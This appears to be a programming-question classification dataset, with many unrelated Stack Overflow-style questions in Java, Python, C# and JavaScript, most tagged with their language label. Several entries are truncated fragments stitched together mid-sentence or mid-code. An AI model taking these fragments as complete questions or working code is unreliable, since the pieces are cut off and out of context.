executorservice  and the program continues to run. in multiple runs of this program  this does happen for me  but not always. i mean  i get output like   <pre><code>start true true time=2621 </code></pre>   or   <pre><code>start false true time=3039 </code></pre>   or if im lucky       <pre><code>start false false time=235 </code></pre>   the times really differ  and i dont even understand why i do get the first two outputs! i d like someone to explain me factors that affect this output  and/or how i am going to get only the 3rd of the above outputs!,java

what is a simple fuzzy string matching algorithm in python   i m trying to find some sort of a good  fuzzy string matching algorithm. direct matching doesn t work for me — this isn t too good because unless my strings are a 100% similar  the match fails. the <a href= http://en.wikipedia.org/wiki/levenshtein_distance  rel= noreferrer >levenshtein</a> method doesn t work too well for strings as it works on a character level. i was looking for something along the lines of word level matching e.g.   <blockquote>    string a: the quick brown fox.        string b: the quick brown fox jumped   over the lazy dog.        these should match as all words in   string a are in string b.  </blockquote>   now  this is an oversimplified example but would anyone know a good  fuzzy string matching algorithm that works on a word level.,python

I was expecting  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21

Is this or a bug or are my assumptions incorrect?

overriding the python help() function behaviour  i ve created a python proxy class that calls methods on a remote object.  i ve used a closure to override the <strong>doc</strong> attribute on my dynamically created methods so that    <pre><code>help(obj.method) </code></pre>   gives me the help on my remote object method.  i then decided that i wanted to do the same thing for the object attributes.  i have in my class something like:   <pre><code>class proxy:     def __getattr__(self  name):         # do stuff to get remote attribute </code></pre>   now when calling code like this:   <pre><code>help(obj.attribute) </code></pre>   i of course get the doc string of the queried value type (string  int or whatever was returned).    the only way i can think to avoid this is to get a stack dump inside <code>__getattr__()</code>  identify and look for the help() call  and conditionally return object/class instead of the remotely queried value. this is obviously non-ideal because there are quite a few ways one could specify the same thing  however it would help me from the command-line which is the most likely place i am to use this  so perhaps better than nothing.    is there a better way,python

Program is saying that tempMeasured's value is Telerik.Web.UI.RadComboBoxItem. But item has text which is what I want. How can I get that text with this code ?

This is how buble sorting should look like:

StringBuilder sb = new StringBuilder(s);
        for (int i = 0; i &lt; sb.Length; i++)
        {

two sum on leetcode  i m trying to do a leetcode question:   <blockquote>    given an array of integers  find two numbers such that they add up to   a specific target number.        the function twosum should return indices of the two numbers such that   they add up to the target  where index1 must be less than index2.   please note that your returned answers (both index1 and index2) are   not zero-based.        you may assume that each input would have exactly one solution.        input: numbers={2  7  11  15}  target=9 output: index1=1  index2=2  </blockquote>   the first try was using two for loops  which gave me o(n^2)  and unfortunately it didn t pass. hence i tried to use:   <pre><code>target - current = index </code></pre>   and search for if the index does exists on a dictionary.    this is my code:   <pre><code>class solution:     def twosum(self  nums  target):         dic = {}          #a number can appear twice inside the same index  so i use a list         for i in xrange(0  len(nums)):             try:                 dic[nums[i]].append(i)             except:                 dic[nums[i]] = []                 dic[nums[i]].append(i)          try:             for items_1 in dic[nums[i]]:                 for items_2 in dic[target-nums[i]]:                     if(items_1+1 != items_2+1):                         l = []                         if(items_2+1 &gt; items_1+1):                             l.append(items_1+1)                             l.append(items_2+1)                         else:                             l.append(items_2+1)                             l.append(items_1+1)                         return l         except:             pass </code></pre>   i developed this locally  and i was able get the correct result with one of the test case that leetcode was complaining: [-3 4 3 90]  0    the output i got was [1  3]  but on leetcode it returned null  does anybody know why this would happen,python
"I could use a TextBox control and make it multiline TextBox and other things.
Or i could use a RichTextBox. Or maybe there are other controls.
What i want is just to show text for reading but to be able also to copy part or the whole text from. Not to paste to it only to read and copy from it.

Inside the click event i want to add the variable content to the control.

<pre><code>void lvnf_Click(object sender, EventArgs e)
        {
            var firstSelectedItem = lvnf.SelectedItems[0];
            string content = allLoadedMessages[firstSelectedItem.Index].MessagePart.GetBodyAsText();
        }

lvnf is a ListView control.

And the variable content is what i want to display in a TextBox or RichTextBox.

accesses an object that  should  exist from another class  i am creating a program that simulates the distribution of a product. the user enters a quantity and that quantity is then randomly divided among x number of distribution sites.     the structure of the program is a main that excepts the original quantity  then sends that quantity to the cpo (central processing office) class. the cpo has a method where it instantiates the required number of distribution sites and another method that determines the value given to each site.    my problem is that i would like the main or a menu class to display the values of the distribution sites  but since they are instantiated within another class  the main does not see them. hence a command like system.out.println(d1);     main file:   <pre><code>public static void main(string[] args) {     // todo code application logic here      //----------------------------------------------------------------------     //  welcome prompt  requests initial quanity of products to be ordered     //----------------------------------------------------------------------     system.out.println(              \twelcome to cpo distribution                       +  \n\t  order placement menu \n\n );     for (int i = 0; i &lt; 55; i++){         system.out.print( = );     }     system.out.println( \nplease enter the quantity of products to be distributed );     system.out.print( product quantity:  );      //----------------------------------------------------------------------             // creates order int to hold the value of the products entered     //----------------------------------------------------------------------     order = input.nextint();     while (order &lt; 1){         system.out.println( please enter a value greater than 0 );         order = input.nextint();     }     for (int i = 0; i &lt; 55; i++){         system.out.print( = );     }     cpo cpo = new cpo(order);     cpo.dcreation();       system.out.println(cpo);     system.out.println(d1);     system.out.println(d2); } </code></pre>   cpo class:   <pre><code>public class cpo {     private static int origin  quantity  site  distributionsites = 3;     private static int d1total  d2total  d3total;     private static securerandom rand = new securerandom();      public cpo(int origin) {         this.origin = origin;         quantity = origin;         site = distributionsites;     }     //----------------------------------------------------------------------------     // get r and set r for order received from cpo     //----------------------------------------------------------------------------          public int getorigin() {         return this.origin;     }      public void setorigin(int origin) {         this.origin = origin;     }      //----------------------------------------------------------------------------     //  instantiating distributors     //----------------------------------------------------------------------------     public static void dcreation() {         getdamount();         distributor d1 = new distributor( d1  d1total);         getdamount();         distributor d2 = new distributor( d2  d2total);         getdamount();         distributor d3 = new distributor( d3  d3total);     }     //----------------------------------------------------------------------------     // method for distributing order to distributors     //----------------------------------------------------------------------------     public static int getdamount(){         site = site - 1;         int remainder = 0;         if ( site == distributionsites ){             remainder = rand.nextint(quantity);             quantity = quantity - remainder;          } else if ( site == distributionsites - 1){             remainder = rand.nextint(quantity);             quantity = quantity - remainder;          } else if (site &lt; 1){             remainder = quantity;             quantity = quantity - remainder;          }         return remainder;     }      public string tostring() {         return  \n the cpo has dispersed an order of   + origin +   products among                   + distributionsites +   distribution sites. \n there are   + quantity                 +   left.  +  sites are   + site;     } } </code></pre>,java

get list of words all starting with the same letter from multiple lists  i m working on a side project and i ve encountered this problem. basically  the input i m dealing with is a list of lists  where the inner lists look something like this:   <pre><code>- [ operating    alive    effective    rapid    progressive    working    mobile ] - [ enjoyable    pleasant    entertaining    amusing    lively    boisterous    convivial    merry    witty ] </code></pre>   there can be any number of inner lists (but i ve considered creating a limitation). what i want to achieve is to return lists of words from each of the lists that begin with the same letter. for example  from the above  we d get something like:   <pre><code>[alive  amusing]  [effective  enjoyable]  [effective  entertaining]  [progressive  pleasant] ... </code></pre>   my question is  what is a good approach  i ve considered going through the entire alphabet and using a boolean array to keep track of which letters had a word in each list starting with that letter  but it seems inefficient  and i m not satisfied with the approach.     for example (not complete  but just for reference..):   <pre><code>d = dict.fromkeys(ascii_lowercase  false)     for c in ascii_lowercase:     found = false     for item in description:         for syn in item:            if syn.startswith(c):                found = true         d[c] = found </code></pre>   and then just grabbing the words starting with the letters marked  true  from each list to build the output list.     am i missing a simpler approach  i m new to python  so i m not sure if i m missing a built in function that could be helpful in this case.    thanks for reading!,python

program allows you specify points in n-dimensional space  so here is the gist of the assignment i am having difficulty with:   <ul> <li> write a java class called point to represent a n-dimensional point (with coordinates that are double)   <ul> <li>the constructor should take any number of coordinates</li> <li>the class should have accessor method for any coordinates</li> <li>write tostring() and copy() and equals() helper methods</li> <li> keep track of every created poin </li> <li> write a java class called line to represent a line (with a starting point and an ending point) </li> <li>the constructor arguments are the start and end points</li> <li>the constructor must throw an error when the 2 points are not of the same dimension</li> <li>write a tostring() and copy() and equals() helper method</li> <li>provide a getlinelength() method - look up  euclidian distance  on wiki</li> <li>keep track of every created line</li> </ul></li> </ul>   so i have created my line and point class but i am not sure if i am creating my line or point class correctly. i already have my main method designed to take input from the console and store that input into two different arrays for the coordinates. when i try to call this method in my main to print the coordinates and distance i get back the output:    the distance between ( 4.0   5.0 )  ( 2.0   3.0 )  ( 0.0   0.0 )   is>     so i was hoping i could get help in clarifying if i am creating my constructor and everything else correctly. here is my code for both classes thus far:   <pre><code>public class point{    private double[] coordinate1;

"I have a list that lists transactions of a bank account, the strings are formatted as:
(Withdrawn + amount)
(Deposited + amount)
they look like 
Withdrawn 200
Deposited 200 etc..
in the list, i'm meant to created a method that finds the suspicious activity which is defined as withdrawing between 100 and 150, so i use the .Contain(withdrawn) to find each element with the word withdrawn in but then how do i find which have the amount between 100 to 150?

they're string types so how do i do something like : If ( 100 > amount > 150) when they're string types?

do i try to trim the string and parse/ .convertall the digit string part to Int? :/ 

Any help? thanks",c#

method in java that returns the first odd found in a range  i need to create a method that receives an <code>int n</code> and tests all integers between <code>n*n+1</code> and <code>(n+1)*(n+1)-1</code> and returns the first odd number it encounters. if no such number is found between these bounds the function will return <code>0</code>.    i m trying to figure out how to do it for a while and i don t get it. i m quite new to java.    can someone help me     i thought in something like that but eclipse says me that <code>this method must return a result of type int</code> and didn t understand why.   <pre><code>public static int test(int n){      // receives argument n          int a = n*n+1;             // calculate lower bound         int b = (n+1)*(n+1)-1;     // calculate upper bound           do {          for (int i = 1; i &lt;=a; i++){             if (a % i == 0){                 return a;             } else if (a % i != 0){                 return 0;             }         }          ++a;      } while (a &lt;= b);      }  </code></pre>,java
generating evenly distributed multiples/samples within a range  <strong>specific instance of problem</strong><br> i have an int range from 1-100. i want to generate n total numbers within this range that are <strong>as evenly distributed as possible</strong> and include the first and last values.    <strong>example</strong>     <pre><code>start = 1  end = 100  n = 5    output: [1  25  50  75  100]  start = 1  end = 100  n = 4    output: [1  33  66  100]  start = 1  end = 100  n = 2    output: [1  100] </code></pre>   <strong>what i currently have</strong><br> i actually have a working approach but i keep feeling i am over thinking this and missing something more simple  is this the most efficient approach or could this be improved    <pre class= lang-python prettyprint-override ><code>def steps(start  end  n):     n = min(end  max(n  2) - 1)     mult = end / float(n)     yield start     for scale in xrange(1  n+1):         val = int(mult * scale)         if val != start:             yield val </code></pre>   note  i am ensuring that this function will always return at least the lower and upper limit values of the range. so  i force <code>n &gt;= 2</code>    just for search reference  i am using this to sample image frames from a rendered sequence  where you would usually want the first  middle  last. but i wanted to be able to scale a bit better to handle really long image sequences and get better coverage.     <strong>solved: from the selected answer</strong>    i ended up using this slightly modified version of @vartec s answer  to be a generator  and also cap the <code>n</code> value for safety:   <pre><code>def steps(start end n):     n = min(end  max(n  2))     step = (end-start)/float(n-1)     return (int(round(start+x*step)) for x in xrange(n)) </code></pre>,python

returning class<t> from a method  i have two classes that extend a common base class. the base class has code that  for one concrete subclass  needs to know the <code>class</code> of the other concrete subclass. so  given <code>foo</code> and <code>bar</code> extending <code>base</code>  an instance of <code>foo</code> needs to know <code>bar.class</code>  and an instance of <code>bar</code> needs to know <code>foo.class</code>.    and  silly me  i m trying to do the right thing and use java generics to ensure that the subclasses return a valid java class object  one that extends the base class.    so  i tried this:   <pre><code>class base {   abstract protected &lt;t extends base&gt; class&lt;t&gt; getotherclass(); } </code></pre>   the compiler seems reasonably happy with that construction. the problem comes in the implementations.    first  i tried:   <pre><code>class foo extends base {   @override   protected &lt;t extends base&gt; class&lt;t&gt; getotherclass() {     return bar.class;   } } </code></pre>   (where <code>bar</code> also extends <code>base</code>)    that complains that i have a type mismatch in the return value  and it requires a cast.    then  i tried:   <pre><code>class foo extends base {   @override   protected class&lt;bar&gt; getotherclass() {     return bar.class;   } } </code></pre>   now the compiler complains about needing a cast at <code>class&lt;bar&gt;</code>.    then i tried:   <pre><code>class foo extends base {   @override   protected class&lt;base&gt; getotherclass() {     return bar.class;   } } </code></pre>   now i get <em>both</em> complaints: needing a cast in the <code>class&lt;base&gt;</code> <em>and</em> in the return value.    is there a way of expressing this that avoids any casts,java

"I'm exploring some options to choose the best development environment for a future project.

Well, I know that C# is dominating in everything related to desktop medical applications programming. If you had to choose today an environment to create a desktop application for a medical device that runs on Windows, involving many mathematical computations for 3D medical imaging - is C# is still the optimal option or are there other alternatives in these days?

Just general thoughts before I dive into the real research...

how to make two classes sharing a same attribute   i have defined a class that posseses an attribute <code>score</code> which is a matrix. let s say that <code>var</code> is an instance of this class.    i have another class that needs to access one particular cell of the matrix <code>var.score</code>. i would like to do something like that :   <pre><code>class myclass:     def __init__(self  r  c):         self.cell = var.score[r][c]     ...     # then make operations on self.cell </code></pre>   except that if <code>self.cell</code> is modified  the modification should also reflect on <code>var.score[r][c]</code>. the goal of creating <code>self.cell</code> and not simply using <code>var.score[r][c]</code> is for clarity and for avoiding dragging <code>r</code> and <code>c</code> along the following definition of the class.    i ve seen solutions using wrapper mutable objects like a list that didn t satisfied me. so what is the best solution to implement that,python

converting negative integer to hex value using pre-defined methods  i am a beginner in java  and have just started learning this language.     i am learning and experimenting with examples from herbert schildt s book to test my understanding.     my objective is to convert negative integer to hex using in-built java methods  and then back to integer (or long). however  there are two issues that i am facing:     <strong>issue #1:</strong> as i understand from the thread <a href= https://stackoverflow.com/questions/39053321/hex-string-to-decimal-conversion noredirect=1&amp;lq=1 >hex string to decimal conversion</a>  <a href= https://stackoverflow.com/questions/6896851/java-integer-parseint-error >java integer parseint error</a> and <a href= https://stackoverflow.com/questions/20110533/converting-hexadecimal-string-to-decimal-integer >converting hexadecimal string to decimal integer</a> that the converted value <code>fffffff1</code> is too big to fit into integer  so i have used long. however  when <code>fffffff1</code> is converted back to long  i don t get -15. i get garbage value = <code>4294967281</code>.     moreover  when i type-cast the result from long to integer  it works well. i am not sure why long result would show garbage value and then magically i would get the right value by just typecasting the number to integer-type. i am sure i am missing something crucial here.    <strong>issue#2:</strong> if i don t use radix (or even change it from <code>16</code> to <code>4</code>) in the method <code>long.parselong()</code>  i get an exception.     here s my code:   <pre><code>public class hexbyte {     public static void main(string[] args) {         byte b = (byte) 0xf1;         system.out.println( integer value is: +integer.valueof(b)); //you would get -15          int i = -15;         system.out.println( hexadecimal value is: +integer.tohexstring(i));         //let s try to convert to hex and then back to integer:        system.out.println( integer of hexadecimal of -15 is: +(int)long.parselong(integer.tohexstring(i) 16 ));         //type-cast to integer works well  but not sure why          system.out.println( integer of hexadecimal of -15 is: +long.parselong(integer.tohexstring(i) 16));         //this surprisingly throws garbage value          system.out.println( integer of hexadecimal of -15 is: +long.parselong(integer.tohexstring(i)));         //doesn t work - throws an exception     } } </code></pre>   can someone please help me  i didn t want to open duplicate threads for above issues so i have included them herewith.,java

nameerror when printing string s length based on input in python  i m a complete beginner in python and i need some  help  with something which is relatively simple (for a non-beginner).     what i m trying to make is a quick  program  which measures the length of a string which has been inputted. maybe i have not looked hard enough  but i can t seem to find any <em>specific</em> information about this on the interwebs.    ok  so here is what i have done so far:   <pre><code>print  please enter a number or word and i will tell you the length of it.   nr = raw_input() print len(nr) </code></pre>   *nr has no significant meaning  it s just a random variable name    everything works as expected at first. for example  i enter the word  hello  and it then replies with  5  or i enter the number 100 and it replies with  3  which is great  but when i attempt to enter another word i get this error:    <pre><code>traceback (most recent call last):   file  &lt;pyshell#0&gt;   line 1  in &lt;module&gt;     hello nameerror: name  hello  is not defined </code></pre>   however  when i enter another number (after i have already entered one)  it just repeats the number which i have entered. for example  when i first enter the number  50  it replies with  2   but when i enter  50  a second time it just repeats the integer to me.    note:  <em>i think</em> i understand the problem for the first part: it doesn t work more than once because the variable  nr  only counts as the first string which has been inputted. even if i m correct  i still don t know a solution to this.,python

"I recently became aware of the odd behavior of <code>Uri.ToString()</code> (namely, it unencodes some characters and therefore is primarily suitable for display purposes). I'm trying to decide between <code>AbsoluteUri</code> and <code>OriginalString</code> as my go-to for converting a <code>Uri</code> object to a string (e. g. in a razor view). 

So far, the only difference I've found between the two is that <code>AbsoluteUri</code> will fail for relative uris (e. g. <code>new Uri(foo, UriKind.Relative).AbsoluteUri</code>). That seems like a point in favor of <code>OriginalString</code>. However, I'm concerned by the word original, since it suggests that maybe some things will not get properly encoded or escaped.

Can anyone confirm the difference between these two properties (aside from the one difference I found)?

"I have a WebAPI endpoint that implements two different versions of the API (legacy and new).  The legacy endpoints use a specific Serializer that has all objects serialized as lower case words with underscores, the v2 endpoint uses camel cased property names.  For example, V1 = document_type and V2 = documentType

This is currently achieved using controller specific attributes to define the serialization, like so:

<pre><code>public class CamelCaseControllerConfiguration : Attribute, IControllerConfiguration
{
    public void Initialize(HttpControllerSettings controllerSettings, HttpControllerDescriptor controllerDescriptor)
    {
        controllerSettings.Formatters.JsonFormatter.SerializerSettings.ContractResolver = new CamelCasePropertyNamesContractResolver();
        controllerSettings.Formatters.JsonFormatter.SerializerSettings.Converters.Add(new StringEnumConverter());
    }
}
</code></pre>

This all works fine when called from a client via REST, but the documentation generated by Swagger always shows the property names using the legacy serializer settings.  Any suggestions on configuring swashbuckle to serialize each version properly?

However, the exact same code doesn't deadlock in an MVC Core web application. The response returns <em>Hello</em>. Why?

creating a pressure heatmap of a foot  for a little background  i m part of a project where we are creating a pressure map of foot impacts. an 8x4 layout of the sensors will be made. each cross-section would be a sensor  which results in 32 unique pressure points.    i am more familiar with the data parsing from sensor data  but i do not exactly know the best method to draw a pressure/heatmap of a foot. essentially  it would look to be something like <a href= http://i.stack.imgur.com/pkocb.png  rel= nofollow >this</a>.  what i had in mind was to use some sort of drawing tool to create the foot shape outline and try to find the pixel point or placement for each sensor point.    each  sensor  could be made of a 5x5 pixel block for example to make the coloring resemble a pressure map better. here is <a href= http://i.stack.imgur.com/vqwma.png  rel= nofollow >my very first crude design of 8x3 sensors</a>. each block would resemble a  sensor  (i forgot a fourth column). to better represent a pressure map  i was thinking of then making each sensor into a 5x5 or 10x10 pixel block to disperse the colors better. my last thought to create the final visual (first image linked) was to somehow mask the foot shape over the rectangular shape  which would make the outside of the foot just blank/white and keep the pressure map colors inside the outline of the foot. how could i mask the foot shape     if there is a better tool out there  i am open to suggestions  or just a nudge to a resource i can use. i appreciate all help!,python

"I created a simple Scene with a SceneManager implemented as a Singleton.

After restrarting the scene with a button, it crashes.

Initially, i thought it was because of the Singleton (the script is attached to a GameObject). But not only the singleton works, but reloading the same istance is found. So the problem is not the singleton.

I found that the problem occurrs creating a GameObject with:

    obj = GameObject.CreatePrimitive(PrimitiveType.Plane);

does java 8 support multiple inheritance   i have come across this topic while reading interface in java 8  there are scenarios where we define method in interface using default or static keyword  allowing the next child to either re-define the same method or implement it. does that means multiple inheritance  there s one more issue that i found is that  return type must be co-variant type else compile issue  that means it still doesn t support multiple inheritance  can we say that java supports multiple inheritance  let me know more details in regard to this topic.,java

"Assuming I have the following XML files:

My goal is to deserialize those 2 xml files using one factory method.

For that I have the following generic code:

 

        public static T get<T>() where T : class // class = all reference types
                {
                    string Ttype = typeof(T).Name;

                    }
                }

Built both xml files with the same root element.

My question is, since the xmlReader.Create function accepts only 1 stream reader
How in the name of *, do i read with the xml reader from 2 xmls??

Do I combine 2 streams into 1 and read from 1st bit to the last 1, if so, how?


Thanks in advance,

"I have to filter the jobs to be run today based on the date. So, for every scheduled date, I am comparing it to DateTime.Today.Date and getting a list of jobs that are scheduled to run today. 
How can I filter the recurring job based on the given cycle time? 
Example:
->If cycle time is 0, run every month on the scheduled date.
->If cycle time is 2, for the first time run the job on scheduled day and then run every two months.

I have to add cycle time in this way, if schedule date = 3/7/2016, cycle time =2, and if scheduled date == today, run service and add 2 months(5/7/2016) and run service on that date and add 2 months(7/7/2016) and so on.
I wrote this way, but if it once returns true it is not checking the other condition. And this is not working for my scenario.

The nearest I found was to execute a job once in a week -

Understanding that Hangfire also accepts standard <code>CronExpression</code>, I've tried exploring cron expression for this frequency but couldn't found one for it-

how to declare a variable to be implemented in the subclass in python  <h2>update</h2>   actually  i have tested all the answers  but a feature i want still can t be achieved. using <code>@property</code> force the subclass to directly declare the property but not something like <code>self.property = xxx</code> in one function. how could i also achieve this     i mean  if the subclass <code>__get__</code> the property before <code>__set__</code>  then raise <code>notimplementederror</code>.   <hr>   how to declare a variable in the super class which should be implemented in the subclass     in other word  i want to declare a virtual variable in super class.   <pre><code>class a:      def a(self):               # perfect!         raise notimplementederror( ... )       b = raise notimplementederror( ... )      #how to declare a variable similar with the function above  </code></pre>,python

since it has access to outside object  i am trying to execute a small snippet code and see. i got the following results. gave explanation for each of the results. can you guys tell me whether its correct or not    <pre><code>var myobject = {     foo:  bar       func: function() {         var self = this;         console.log( outer func:  this.foo =   + this.foo);         console.log( outer func:  self.foo =   + self.foo);         (function() {             console.log( inner func:  this.foo =   + this.foo);             console.log( inner func:  self.foo =   + self.foo);         }());     } }; myobject.func();   outer func:  this.foo = bar ------------&gt; since it has access to outside object outer func:  self.foo = bar ------------&gt; since it has access to outside object inner func:  this.foo = undefined ------------&gt; dont know why its undefined inner func:  self.foo = bar ------------&gt; since it has access to variable self </code></pre>,javascript

why do lots of programmers move commas to the next line   tell me please  what is the sacred power of the style below:   <pre class= lang-js prettyprint-override ><code>var javascript = new language(    brendan eich    new date(1995  0  1)   [ c    java    scheme ] ); </code></pre>   why do lots of programmers use that style  what benefits does it have  for example     <pre><code>var javascript = new language(    brendan eich     new date(1995  0  1)    [ c    java    scheme ] ); </code></pre>   i like much more than previous. thanks.,javascript
"I have this method in Java which I would like to implement in C#, but I don't know exactly how.

<pre><code>public static &lt;T&gt; Set&lt;T&gt; getAddedItems(Set&lt;T&gt; before, Set&lt;T&gt; after) {
    Set&lt;T&gt; out = new HashSet&lt;T&gt;(after);
    out.removeAll(before);
    return out;
}
</code></pre>

For implementing <code>Set&lt;T&gt;</code>, I have chosen the class <code>HashSet&lt;T&gt;</code>. The problem is that I don't know what to do with the generic type parameter <code>&lt;T&gt;</code>. I am quite new to C# and in Java I hadn't worked with generics until a couple weeks ago, so my apologies if my question is too obvious.

"I have some code that maps strongly-typed business objects into anonymous types, which are then serialized into JSON and exposed via an API.

After restructuring my solution into separate projects, some of my tests started to fail. I've done a bit of digging and it turns out that <code>Object.Equals</code> behaves differently on anonymous types that are returned by code from a different assembly - and I'm not sure why, or what I can do to work around it.

There's full repro code at <a href=https://github.com/dylanbeattie/AnonymousTypeEquality>https://github.com/dylanbeattie/AnonymousTypeEquality</a> but the bit that's actually breaking is below. This code is in the Tests project:

<pre><code>[TestFixture]
public class Tests {
    [Test]
    public void BothInline() {
        var a = new { name = test, value = 123 };
        var b = new { name = test, value = 123 };
        Assert.That(Object.Equals(a,b)); // passes
    }

    [Test]
    public void FromLocalMethod() {
        var a = new { name = test, value = 123 };
        var b = MakeObject(test, 123);
        Assert.That(Object.Equals(a, b)); // passes
    }

    [Test]
    public void FromOtherNamespace() {
        var a = new { name = test, value = 123 };
        var b = OtherNamespaceClass.MakeObject(test, 123);
        Assert.That(Object.Equals(a, b)); // passes
    }


    [Test]
    public void FromOtherClass() {
        var a = new { name = test, value = 123 };
        var b = OtherClass.MakeObject(test, 123);

        /* This is the test that fails, and I cannot work out why */
        Assert.That(Object.Equals(a, b));
    }

    private object MakeObject(string name, int value) {
        return new { name, value };
    }
}
</code></pre>

and then there is a separate class library in the solution containing only this:

<pre><code>namespace OtherClasses {
  public static class OtherClass {
    public static object MakeObject(string name, int value) {
      return new { name, value };
    }
  }  
}
</code></pre>

According to <a href=https://msdn.microsoft.com/en-GB/library/bb397696.aspx>MSDN</a>, two instances of the <strong>same anonymous type</strong> are equal only if all their properties are equal. (my emphasis) - so what controls whether two instances are of the <strong>same</strong> anonymous type for comparison purposes? My two instances have equal hash codes, and both appear to be <code>&lt;>f__AnonymousType0`2[System.String,System.Int32]</code> - but I'm guessing that equality for anonymous types must take the fully qualified type name into account and therefore moving code into a different assembly can break things. Anyone got a definitive source / link on exactly how this is implemented?

how to cleanly structure multiple asynchronous calls in javascript   i m just getting used to callbacks in javascript  but quickly found my code getting unwieldy and think there s a smarter way to approach this.    i have a process  let s call it <code>doaabbcc()</code> that has three subprocesses:   <pre><code>var doaa = function(onaacompleted) {   // do something slow   onaacompleted(true); };  var dobb = function(onbbcompleted) {   // do something slow   onbbcompleted(true); };  var docc = function(oncccompleted) {   // do something slow   oncccompleted(false); };  var onaabbcccompleted = function(succeeded) {   console.log( did doaabbcc() complete successfully :   + succeeded); };  /// @brief performs a  b and c  stopping at first failure /// @param[in] onaabbcccompleted  called on completion of this method. ///                               passes whether overall operation succeeded. var doaabbcc = function(onaabbcccompleted) {   // beginning of strangeness   doaa(function(asucceeded) {     if (!asucceeded) {       onaabbcccompleted(asucceeded);     }     dobb(function(bsucceeded) {       if (!bsucceeded) {         onaabbcccompleted(bsucceeded);       }       docc(function(csucceeded) {         onaabbcccompleted(csucceeded);       });     });   }); }; </code></pre>   each subprocess can fail and i m not quite sure how to bubble up that error and/or provide a way for the passed in callback to react to a success different from a failure.  each subprocess also needs to call itself a handful of times to finish its process.    i guess what i m asking is  is there a javascript-best-practice way to approach this,javascript
trying to get prime factorization for sieve of eratosthenes  i have a file of numbers that i need the prime factorization for. so it should look like:  250 000 001 = 148 721 * 41 * 41  on the output. my code so far is:   <pre><code>factors = [2  5  7  9  -1]  def primefactors(x  primes):     mylist = []     myfile = open( ten.txt    r   encoding =  utf-8 )     for x in myfile:         x = (int(x) % f for f in factors)         mylist.append(x)         print(mylist)  primefactors(open( ten.txt    r   encoding =  utf-8 )  factors) </code></pre>   with the output being (generator object (genexpr) at 0x100647870)    what do i need to do to even get the factors listed out     <strong>edit</strong> i guess i should mention that this is completely wrong i realize that. but here i made some edits to my code. i am intending to print out the factorization using factors under 10 000 000.   <pre><code>factors = [2  3  5  7  11  -1] n = 10000000 primes = list() multiples = set() #creates list of primes out of 10 000 000 for i in range(2  n+1):     if i not in multiples:         primes.append(i)         multiples.update(range(i*i  n+1  i))  def primefactors(x  primes):     factors = [f for f in primes]    #trying to get the factorization for 25 000 001     if x % factors == 0:         return primes primefactors(25000001  primes) </code></pre>   the problem is that i do not know how to get my x value  25000001 to be divided one by one until it comes out without a remainder into the aforementioned factorization in the first post.    does that make sense,python
why use window.onload  i have tried finding an answer to this on my own  but only found instructions on how to use onload events. i seem to be missing the point.    i ve been taught that if i want something to happen when the page loads  i should use window.onload like this:   <pre><code>&lt;script&gt;     window.onload = dosomething();      function dosomething()     {         window.alert( hello );     } &lt;/script&gt; </code></pre>   but now that i am thinking on my own i wonder what the point of doing that is. because this also produces the same result:   <pre><code>&lt;script&gt;     dosomething();      function dosomething()     {         window.alert( hello );     } &lt;/script&gt; </code></pre>   anything i put at the top inside <code>&lt;script&gt;</code> is going to execute anyway... so what s the point of window.onload,javascript

split string in java with potential split characters used in string parts  <strong>how would you split this string format into parts:</strong>   <pre><code>message_type={any_text}&amp;message_number={digits}&amp;code={digits}&amp;id={digits}&amp;message={any_text}&amp;timestamp={digits_with_decimal} </code></pre>   where in the <code>message={any_text}</code> part  the <em>{any_text}</em> may contain a <code>&amp;</code> and a <code>=</code> thus not being able to do string split by <code>&amp;</code> or <code>=</code>    and the order of the message parts may be scrambled or not in this order. i am thinking that a pattern can be extracted for a solution  <code>={the_text_needed}&amp;</code> however this would not apply for the last part of the string as there will be no <code>&amp;</code> at the end.,java

how to put multiple  statements in one line   i wasn t sure under what title to ponder this question exactly  coding golf seems appropriate if a bit unspecific.    i know a little bit of comprehensions in python but they seem very hard to  read . the way i see it  a comprehension might accomplish the same as the following code:   <pre><code>for i in range(10): if i == 9: print( i equals 9 ) </code></pre>   this code is much easier to read than how comprehensions currently work but i ve noticed you cant have two  :  in one line ... this brings me too...   <h1><strong>my question:</strong></h1>   is there any way i can get the following example into one line.   <pre><code>try:     if sam[0] !=  harry :         print( hello    sam) except:     pass </code></pre>   something like this would be great:   <pre><code>try: if sam[0] !=  harry : print( hellp    sam) except:pass </code></pre>   but again i encounter the conflicting  :  i d also love to know if there s a way to run <strong>try</strong> (or something like it) without except  it seems entirely pointless that i need to put except:pass in there. its a wasted line.    thank you for you input ... and here have a smiley <strong>:d</strong>,python
checking for duplicates in an array backwards  this is the same person who had trouble with the last array problem just one or two days ago. we ve a new assignment which asks us to find and replace duplicates in an array of randomly generated numbers. i wrote a code and sent it to my teacher for feedback; she responded with this solution:    <blockquote>    so  take the first random num and store into the first slot (this can be done before the loop).  then  start a loop that creates the second random num and tests backwards to see if there are duplicates from the ones already stored.  so  a backwards loops that tests for duplicates and counts down to 0 from the current location and replaces duplicates. once that test passes  then you ll go to the next element  create a new random number  and then test the ones before it for duplicates.  </blockquote>   i ve done this here  and it s reduced the number of randomly generated numbers  but i still run into the stray duplicate:    <pre><code>import java.lang.object;     import java.util.random;  public class prog433a {      public static void main(string[]args) {          random randslct = new random();          int[] list = new int[20];         int counter = 0;         int index = 0;         int min2 = 0;           system.out.println( \nafter );          for (int k = 0; k &lt; list.length - 1; k++) {             list [k] = randslct.nextint(30) + 1;             for (int z = list.length - 1; z &gt;= 0; z--) {                 if (list[k] == list[z] &amp;&amp; z!=k) {                     while (list[k] == list[z]) {                         list [k] = randslct.nextint(30) + 1;                      }                 }             }         }          int min = list[0];         while (counter &lt; list.length - 1) {             for (int x = 0; x &lt; list.length - 1; x++) { // scroll through the indexes.                 if (list[x] &lt; min) {                     min = list[x];                     index = x; // keep the index of the biggest number.                 }              }             system.out.println(list[index]);             min = 100 * (list[index]);              list[index] = 100 * (list[index]); // change the value in the original array so it won t find the same max again             counter++;         }     } } </code></pre>   system output:   <pre><code>after 2 5 6 10 11 12 13 15 16 17 19 22 22 24 25 27 28 29 29   after 1 2 2 4 5 7 8 9 10 13 15 16 21 24 25 26 28 29 30  after 1 2 3 5 6 7 11 12 13 14 15 16 18 21 22 25 26 27 29  after 2 3 3 4 6 10 12 14 15 16 17 20 22 23 24 25 26 27 30  after 7 8 11 12 13 14 15 16 17 17 18 19 20 21 23 24 27 29 30 </code></pre>   i posted my output towards the bottom. because this is an introductory coding class  i d prefer if the solution did not involve sets or any of the like. but alas  beggars cannot be choosers.  